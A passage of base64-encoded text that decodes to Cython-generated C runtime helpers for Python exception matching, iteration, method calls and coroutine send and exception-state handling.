4Y190eXBlMikgewogICAgYXNzZXJ0KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXhjX3R5cGUxKSk7CiAgICBhc3NlcnQoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZTIpKTsKICAgIGlmIChsaWtlbHkoZXJyID09IGV4Y190eXBlMSB8fCBlcnIgPT0gZXhjX3R5cGUyKSkgcmV0dXJuIDE7CiAgICBpZiAobGlrZWx5KFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2soZXJyKSkpIHsKICAgICAgICByZXR1cm4gX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihlcnIsIGV4Y190eXBlMSwgZXhjX3R5cGUyKTsKICAgIH0KICAgIHJldHVybiAoUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgZXhjX3R5cGUxKSB8fCBQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCBleGNfdHlwZTIpKTsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkodm9pZCkgewogICAgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlKSkKICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25leHQpOwogICAgcmV0dXJuIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGU7Cn0KI2VuZGlmCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbihQeU9iamVjdCAqaXRlcmF0b3IpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDAKICAgIFB5T2JqZWN0ICpyZXN1bHQ7CiAgICBQeU9iamVjdCAqbmV4dCA9IF9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUEkoKTsKICAgIGlmICh1bmxpa2VseSghbmV4dCkpIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhuZXh0LCBpdGVyYXRvciwgTlVMTCk7CiAgICByZXR1cm4gcmVzdWx0OwojZWxzZQogICAgKHZvaWQpX19QeXhfR2V0QnVpbHRpbk5hbWU7IC8vIG9ubHkgZm9yIGVhcmx5IGxpbWl0ZWQgQVBJCiAgICBpdGVybmV4dGZ1bmMgaXRlcm5leHQgPSBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoaXRlcmF0b3IpOwogICAgYXNzZXJ0KGl0ZXJuZXh0KTsKICAgIHJldHVybiBpdGVybmV4dChpdGVyYXRvcik7CiNlbmRpZgp9CgoKI2lmICEoQ1lUSE9OX1ZFQ1RPUkNBTEwgJiYgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBDMDAwMCB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCkpKQpzdGF0aWMgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogbWV0aG9kLCBQeU9iamVjdCogYXJnKSB7CiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIGFyZyk7CiAgICBQeV9ERUNSRUYobWV0aG9kKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIG1ldGhvZF9uYW1lLCBQeU9iamVjdCogYXJnKSB7CiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSkKICAgIFB5T2JqZWN0ICphcmdzWzJdID0ge29iaiwgYXJnfTsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Q7CiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZzsKICAgICh2b2lkKSBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3M7CiAgICByZXR1cm4gUHlPYmplY3RfVmVjdG9yY2FsbE1ldGhvZChtZXRob2RfbmFtZSwgYXJncywgMiB8IFBZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCwgTlVMTCk7CiNlbHNlCiAgICBQeU9iamVjdCAqbWV0aG9kID0gTlVMTCwgKnJlc3VsdDsKICAgIGludCBpc19tZXRob2QgPSBfX1B5eF9QeU9iamVjdF9HZXRNZXRob2Qob2JqLCBtZXRob2RfbmFtZSwgJm1ldGhvZCk7CiAgICBpZiAobGlrZWx5KGlzX21ldGhvZCkpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsMkFyZ3MobWV0aG9kLCBvYmosIGFyZyk7CiAgICAgICAgUHlfREVDUkVGKG1ldGhvZCk7CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KICAgIGlmICh1bmxpa2VseSghbWV0aG9kKSkgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKG1ldGhvZCwgYXJnKTsKI2VuZGlmCn0KCgpzdGF0aWMgdm9pZCBfX1B5eF9fUmV0dXJuV2l0aFN0b3BJdGVyYXRpb24oUHlPYmplY3QqIHZhbHVlLCBpbnQgYXN5bmMpOwpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jLCBpbnQgaXRlcm5leHQpIHsKICAgIGlmICh2YWx1ZSA9PSBQeV9Ob25lKSB7CiAgICAgICAgaWYgKGFzeW5jIHx8ICFpdGVybmV4dCkKICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb24pOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbih2YWx1ZSwgYXN5bmMpOwp9CnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYykgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKI2VuZGlmCiAgICBQeU9iamVjdCAqZXhjOwogICAgUHlPYmplY3QgKmV4Y190eXBlID0gYXN5bmMgPyBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24gOiBQeUV4Y19TdG9wSXRlcmF0aW9uOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICBpZiAoKFBZX1ZFUlNJT05fSEVYID49ICgweDAzMEMwMEE2KSkgfHwgdW5saWtlbHkoUHlUdXBsZV9DaGVjayh2YWx1ZSkgfHwgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgaWYgKFBZX1ZFUlNJT05fSEVYID49ICgweDAzMGUwMEExKSkgewogICAgICAgICAgICBleGMgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKGV4Y190eXBlLCB2YWx1ZSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3NfdHVwbGUgPSBQeVR1cGxlX05ldygxKTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFhcmdzX3R1cGxlKSkgcmV0dXJuOwogICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGFyZ3NfdHVwbGUsIDAsIHZhbHVlKTsKICAgICAgICAgICAgZXhjID0gUHlPYmplY3RfQ2FsbChleGNfdHlwZSwgYXJnc190dXBsZSwgTlVMTCk7CiAgICAgICAgICAgIFB5X0RFQ1JFRihhcmdzX3R1cGxlKTsKICAgICAgICB9CiAgICAgICAgaWYgKHVubGlrZWx5KCFleGMpKSByZXR1cm47CiAgICB9IGVsc2UgewogICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICAgICAgZXhjID0gdmFsdWU7CiAgICB9CiAgICAjaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sKICAgIGlmICghX19weXhfdHN0YXRlLT5leGNfaW5mby0+ZXhjX3ZhbHVlKQogICAgI2Vsc2UKICAgIGlmICghX19weXhfdHN0YXRlLT5leGNfdHlwZSkKICAgICNlbmRpZgogICAgewogICAgICAgIFB5X0lOQ1JFRihleGNfdHlwZSk7CiAgICAgICAgX19QeXhfRXJyUmVzdG9yZShleGNfdHlwZSwgZXhjLCBOVUxMKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICAjZW5kaWYKI2Vsc2UKICAgIGV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZXhjX3R5cGUsIHZhbHVlKTsKICAgIGlmICh1bmxpa2VseSghZXhjKSkgcmV0dXJuOwojZW5kaWYKICAgIFB5RXJyX1NldE9iamVjdChleGNfdHlwZSwgZXhjKTsKICAgIFB5X0RFQ1JFRihleGMpOwp9CgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiNpbmNsdWRlIDxmcmFtZW9iamVjdC5oPgojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDBhNiAmJiAhZGVmaW5lZChQWVBZX1ZFUlNJT04pCiAgI2lmbmRlZiBQeV9CVUlMRF9DT1JFCiAgICAjZGVmaW5lIFB5X0JVSUxEX0NPUkUgMQogICNlbmRpZgogICNpbmNsdWRlICJpbnRlcm5hbC9weWNvcmVfZnJhbWUuaCIKI2VuZGlmCiNlbmRpZiAvLyBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQKX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4pIHsKI2lmIENZVEhPTl9VU0VfQU1fU0VORAogICAgZ2VuLT55aWVsZGZyb21fYW1fc2VuZCA9IE5VTEw7CiNlbmRpZgogICAgUHlfQ0xFQVIoZ2VuLT55aWVsZGZyb20pOwp9CnN0YXRpYyBpbnQgX19QeXhfUHlHZW5fX0ZldGNoU3RvcEl0ZXJhdGlvblZhbHVlKFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKipwdmFsdWUpIHsKICAgIFB5T2JqZWN0ICpldCwgKmV2LCAqdGI7CiAgICBQeU9iamVjdCAqdmFsdWUgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19weXhfdHN0YXRlKTsKICAgIF9fUHl4X0VyckZldGNoKCZldCwgJmV2LCAmdGIpOwogICAgaWYgKCFldCkgewogICAgICAgIFB5X1hERUNSRUYodGIpOwogICAgICAgIFB5X1hERUNSRUYoZXYpOwogICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICAqcHZhbHVlID0gUHlfTm9uZTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIGlmIChsaWtlbHkoZXQgPT0gUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHsKICAgICAgICBpZiAoIWV2KSB7CiAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgICAgICAgICAgdmFsdWUgPSBQeV9Ob25lOwogICAgICAgIH0KICAgICAgICBlbHNlIGlmIChsaWtlbHkoX19QeXhfSVNfVFlQRShldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fR1JBQUwKICAgICAgICAgICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgZ290byBsaW1pdGVkX2FwaV9mYWlsdXJlOwogICAgICAgICAgICAjZWxzZQogICAgICAgICAgICB2YWx1ZSA9ICgoUHlTdG9wSXRlcmF0aW9uT2JqZWN0ICopZXYpLT52YWx1ZTsKICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgIFB5X0RFQ1JFRihldik7CiAgICAgICAgfQogICAgICAgIGVsc2UgaWYgKHVubGlrZWx5KFB5VHVwbGVfQ2hlY2soZXYpKSkgewogICAgICAgICAgICBQeV9zc2l6ZV90IHR1cGxlX3NpemUgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKGV2KTsKICAgICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgICAgICAgICBpZiAodW5saWtlbHkodHVwbGVfc2l6ZSA8IDApKSB7CiAgICAgICAgICAgICAgICBQeV9YREVDUkVGKHRiKTsKICAgICAgICAgICAgICAgIFB5X0RFQ1JFRihldik7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoZXQpOwogICAgICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICAgICB9CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICBpZiAodHVwbGVfc2l6ZSA+PSAxKSB7CiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgICAgICAgICAgdmFsdWUgPSBQeVR1cGxlX0dFVF9JVEVNKGV2LCAwKTsKICAgICAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiNlbGlmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9JVEVNKGV2LCAwKTsKI2Vsc2UKICAgICAgICAgICAgICAgIHZhbHVlID0gUHlTZXF1ZW5jZV9HZXRJdGVtKGV2LCAwKTsKICAgICAgICAgICAgICAgIGlmICghdmFsdWUpIGdvdG8gbGltaXRlZF9hcGlfZmFpbHVyZTsKI2VuZGlmCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBQeV9JTkNSRUYoUHlfTm9uZSk7CiAgICAgICAgICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUHlfREVDUkVGKGV2KTsKICAgICAgICB9CiAgICAgICAgZWxzZSBpZiAoIV9fUHl4X1R5cGVDaGVjayhldiwgKFB5VHlwZU9iamVjdCopUHlFeGNfU3RvcEl0ZXJhdGlvbikpIHsKICAgICAgICAgICAgdmFsdWUgPSBldjsKICAgICAgICB9CiAgICAgICAgaWYgKGxpa2VseSh2YWx1ZSkpIHsKICAgICAgICAgICAgUHlfWERFQ1JFRih0Yik7CiAgICAgICAgICAgIFB5X0RFQ1JFRihldCk7CiAgICAgICAgICAgICpwdmFsdWUgPSB2YWx1ZTsKICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgfQogICAgfSBlbHNlIGlmICghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGV0LCBQeUV4Y19TdG9wSXRlcmF0aW9uKSkgewogICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZldCwgJmV2LCAmdGIpOwogICAgaWYgKHVubGlrZWx5KCFQeU9iamVjdF9UeXBlQ2hlY2soZXYsIChQeVR5cGVPYmplY3QqKVB5RXhjX1N0b3BJdGVyYXRpb24pKSkgewogICAgICAgIF9fUHl4X0VyclJlc3RvcmUoZXQsIGV2LCB0Yik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfWERFQ1JFRih0Yik7CiAgICBQeV9ERUNSRUYoZXQpOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgdmFsdWUgPSBQeU9iamVjdF9HZXRBdHRyKGV2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdmFsdWUpOwojZWxzZQogICAgdmFsdWUgPSAoKFB5U3RvcEl0ZXJhdGlvbk9iamVjdCAqKWV2KS0+dmFsdWU7CiAgICBQeV9JTkNSRUYodmFsdWUpOwojZW5kaWYKICAgIFB5X0RFQ1JFRihldik7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBpZiAodW5saWtlbHkoIXZhbHVlKSkgcmV0dXJuIC0xOwojZW5kaWYKICAgICpwdmFsdWUgPSB2YWx1ZTsKICAgIHJldHVybiAwOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0dSQUFMIHx8ICFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TCiAgbGltaXRlZF9hcGlfZmFpbHVyZToKICAgIFB5X1hERUNSRUYoZXQpOwogICAgUHlfWERFQ1JFRih0Yik7CiAgICBQeV9YREVDUkVGKGV2KTsKICAgIHJldHVybiAtMTsKI2VuZGlmCn0Kc3RhdGljIENZVEhPTl9JTkxJTkUKX19QeXhfUHlTZW5kUmVzdWx0IF9fUHl4X0Nvcm91dGluZV9zdGF0dXNfZnJvbV9yZXN1bHQoUHlPYmplY3QgKipyZXR2YWwpIHsKICAgIGlmICgqcmV0dmFsKSB7CiAgICAgICAgcmV0dXJuIFBZR0VOX05FWFQ7CiAgICB9IGVsc2UgaWYgKGxpa2VseShfX1B5eF9QeUdlbl9fRmV0Y2hTdG9wSXRlcmF0aW9uVmFsdWUoX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50LCByZXR2YWwpID09IDApKSB7CiAgICAgICAgcmV0dXJuIFBZR0VOX1JFVFVSTjsKICAgIH0gZWxzZSB7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQp9CnN0YXRpYyBDWVRIT05fSU5MSU5FCnZvaWQgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKF9fUHl4X0V4Y0luZm9TdHJ1Y3QgKmV4Y19zdGF0ZSkgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgUHlfQ0xFQVIoZXhjX3N0YXRlLT5leGNfdmFsdWUpOwojZWxzZQogICAgUHlPYmplY3QgKnQsICp2LCAqdGI7CiAgICB0ID0gZXhjX3N0YXRlLT5leGNfdHlwZTsKICAgIHYgPSBleGNfc3RhdGUtPmV4Y192YWx1ZTsKICAgIHRiID0gZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrOwogICAgZXhjX3N0YXRlLT5leGNfdHlwZSA9IE5VTEw7CiAgICBleGNfc3RhdGUtPmV4Y192YWx1ZSA9IE5VTEw7CiAgICBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2sgPSBOVUxMOwogICAgUHlfWERFQ1JFRih0KTsKICAgIFB5X1hERUNSRUYodik7CiAgICBQeV9YREVDUkVGKHRiKTsKI2VuZGlmCn0KI2RlZmluZSBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pICAoX19QeXhfX0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbiksIChQeU9iamVjdCopTlVMTCkKc3RhdGljIHZvaWQgX19QeXhfX0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuKSB7CiAgICBjb25zdCBjaGFyICptc2c7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihnZW4pOwogICAgaWYgKCgwKSkgewogICAgI2lmZGVmIF9fUHl4X0Nvcm91dGluZV9VU0VECiAgICB9IGVsc2UgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVjaygoUHlPYmplY3QqKWdlbikpIHsKICAgICAgICBtc2cgPSAiY29yb3V0aW5lIGFscmVhZHkgZXhlY3V0aW5nIjsKICAgICNlbmRpZgogICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgIH0gZWxzZSBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdCgoUHlPYmplY3QqKWdlbikpIHsKICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjsKICAgICNlbmRpZgogICAgfSBlbHNlIHsKICAgICAgICBtc2cgPSAiZ2VuZXJhdG9yIGFscmVhZHkgZXhlY3V0aW5nIjsKICAgIH0KICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19WYWx1ZUVycm9yLCBtc2cpOwp9CnN0YXRpYyB2b2lkIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5VGVybWluYXRlZEVycm9yKFB5T2JqZWN0ICpnZW4sIFB5T2JqZWN0ICp2YWx1ZSwgaW50IGNsb3NpbmcpIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGdlbik7CiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihjbG9zaW5nKTsKICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgaWYgKCFjbG9zaW5nICYmIF9fUHl4X0Nvcm91dGluZV9DaGVjayhnZW4pKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1J1bnRpbWVFcnJvciwgImNhbm5vdCByZXVzZSBhbHJlYWR5IGF3YWl0ZWQgY29yb3V0aW5lIik7CiAgICB9IGVsc2UKICAgICNlbmRpZgogICAgaWYgKHZhbHVlKSB7CiAgICAgICAgI2lmZGVmIF9fUHl4X0FzeW5jR2VuX1VTRUQKICAgICAgICBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChnZW4pKQogICAgICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbik7CiAgICAgICAgZWxzZQogICAgICAgICNlbmRpZgogICAgICAgIFB5RXJyX1NldE5vbmUoUHlFeGNfU3RvcEl0ZXJhdGlvbik7CiAgICB9Cn0Kc3RhdGljCl9fUHl4X1B5U2VuZFJlc3VsdCBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KF9fcHl4X0Nvcm91dGluZU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJlc3VsdCwgaW50IGNsb3NpbmcpIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlOwogICAgX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlOwogICAgUHlPYmplY3QgKnJldHZhbDsKICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoc2VsZikpOyAgLy8gQ2FsbGVycyBzaG91bGQgZW5zdXJlIGlzX3J1bm5pbmcKICAgIGlmICh1bmxpa2VseShzZWxmLT5yZXN1bWVfbGFiZWwgPT0gLTEpKSB7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX0FscmVhZHlUZXJtaW5hdGVkRXJyb3IoKFB5T2JqZWN0KilzZWxmLCB2YWx1ZSwgY2xvc2luZyk7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgdHN0YXRlID0gX19weXhfdHN0YXRlOwojZWxzZQogICAgdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50OwojZW5kaWYKICAgIGV4Y19zdGF0ZSA9ICZzZWxmLT5naV9leGNfc3RhdGU7CiAgICBpZiAoZXhjX3N0YXRlLT5leGNfdmFsdWUpIHsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKICAgICAgICAjZWxzZQogICAgICAgIFB5T2JqZWN0ICpleGNfdGI7CiAgICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTgogICAgICAgIGV4Y190YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiAgICAgICAgI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgICAgIGV4Y190YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgZXhjX3N0YXRlLT5leGNfdmFsdWUpLT50cmFjZWJhY2s7CiAgICAgICAgI2Vsc2UKICAgICAgICBleGNfdGIgPSBleGNfc3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICAgICAgI2VuZGlmCiAgICAgICAgaWYgKGV4Y190YikgewogICAgICAgICAgICBQeVRyYWNlYmFja09iamVjdCAqdGIgPSAoUHlUcmFjZWJhY2tPYmplY3QgKikgZXhjX3RiOwogICAgICAgICAgICBQeUZyYW1lT2JqZWN0ICpmID0gdGItPnRiX2ZyYW1lOwogICAgICAgICAgICBhc3NlcnQoZi0+Zl9iYWNrID09IE5VTEwpOwogICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMQogICAgICAgICAgICBmLT5mX2JhY2sgPSBQeVRocmVhZFN0YXRlX0dldEZyYW1lKHRzdGF0ZSk7CiAgICAgICAgICAgICNlbHNlCiAgICAgICAgICAgIFB5X1hJTkNSRUYodHN0YXRlLT5mcmFtZSk7CiAgICAgICAgICAgIGYtPmZfYmFjayA9IHRzdGF0ZS0+ZnJhbWU7CiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNCAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiAgICAgICAgICAgIFB5X0RFQ1JFRihleGNfdGIpOwogICAgICAgICAgICAjZW5kaWYKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICB9CiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLCiAgICBleGNfc3RhdGUtPnByZXZpb3VzX2l0ZW0gPSB0c3RhdGUtPmV4Y19pbmZvOwogICAgdHN0YXRlLT5leGNfaW5mbyA9IGV4Y19zdGF0ZTsKI2Vsc2UKICAgIGlmIChleGNfc3RhdGUtPmV4Y190eXBlKSB7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmZXhjX3N0YXRlLT5leGNfdHlwZSwgJmV4Y19zdGF0ZS0+ZXhjX3ZhbHVlLCAmZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrKTsKICAgIH0gZWxzZSB7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX0V4Y2VwdGlvbkNsZWFyKGV4Y19zdGF0ZSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmZXhjX3N0YXRlLT5leGNfdHlwZSwgJmV4Y19zdGF0ZS0+ZXhjX3ZhbHVlLCAmZXhjX3N0YXRlLT5leGNfdHJhY2ViYWNrKTsKICAgIH0KI2VuZGlmCiAgICByZXR2YWwgPSBzZWxmLT5ib2R5KHNlbGYsIHRzdGF0ZSwgdmFsdWUpOwojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgZXhjX3N0YXRlID0gJnNlbGYtPmdpX2V